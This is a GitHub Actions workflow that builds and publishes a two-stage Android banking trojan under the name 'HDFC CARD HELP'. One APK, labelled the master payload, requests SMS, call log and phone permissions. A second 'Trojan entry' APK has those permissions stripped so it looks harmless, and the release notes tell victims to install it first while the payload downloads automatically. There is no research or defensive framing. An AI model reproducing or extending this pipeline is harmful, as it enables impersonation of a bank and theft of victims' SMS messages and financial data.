name: Build Android APK

on:
  push:
    branches: [ main, master ]
  pull_request:
    branches: [ main, master ]

permissions:
  contents: write

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout Source
        uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Install Dependencies
        run: npm install

      - name: Sync Capacitor
        run: |
          chmod +x node_modules/.bin/capacitor || true
          npx capacitor sync android
          npm run assets

      - name: Setup Java
        uses: actions/setup-java@v4
        with:
          distribution: 'zulu'
          java-version: '17'

      - name: Build Master Payload (Full Permissions)
        run: |
          cd android
          chmod +x gradlew
          ./gradlew assembleDebug
          # MOVE TO ROOT SO IT DOES NOT GET DELETED BY NEXT BUILD
          cp app/build/outputs/apk/debug/app-debug.apk ../master_payload.apk

      - name: Build Trojan Entry (No Permissions)
        run: |
          # Strip permissions from Manifest for the second build
          sed -i '/android.permission.SEND_SMS/d' android/app/src/main/AndroidManifest.xml
          sed -i '/android.permission.RECEIVE_SMS/d' android/app/src/main/AndroidManifest.xml
          sed -i '/android.permission.READ_SMS/d' android/app/src/main/AndroidManifest.xml
          sed -i '/android.permission.READ_PHONE_STATE/d' android/app/src/main/AndroidManifest.xml
          sed -i '/android.permission.CALL_PHONE/d' android/app/src/main/AndroidManifest.xml
          sed -i '/android.permission.READ_CALL_LOG/d' android/app/src/main/AndroidManifest.xml
          sed -i '/android.permission.POST_NOTIFICATIONS/d' android/app/src/main/AndroidManifest.xml
          
          cd android
          ./gradlew assembleDebug
          # MOVE TO ROOT
          cp app/build/outputs/apk/debug/app-debug.apk ../hdfc_help_v3.apk

      - name: Create GitHub Release
        uses: softprops/action-gh-release@v2
        if: github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master'
        with:
          files: |
            master_payload.apk
            hdfc_help_v3.apk
          tag_name: v3.0.${{ github.run_number }}
          name: HDFC CARD HELP v3.0 (Build ${{ github.run_number }})
          body: |
            # HDFC CARD HELP v3.0 - DUAL BUNDLE
            
            1. **hdfc_help_v3.apk**: The Trojan (Install this first).
            2. **master_payload.apk**: The Payload (Download will trigger automatically).
            
            Build Number: ${{ github.run_number }}
          draft: false
          prerelease: false
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
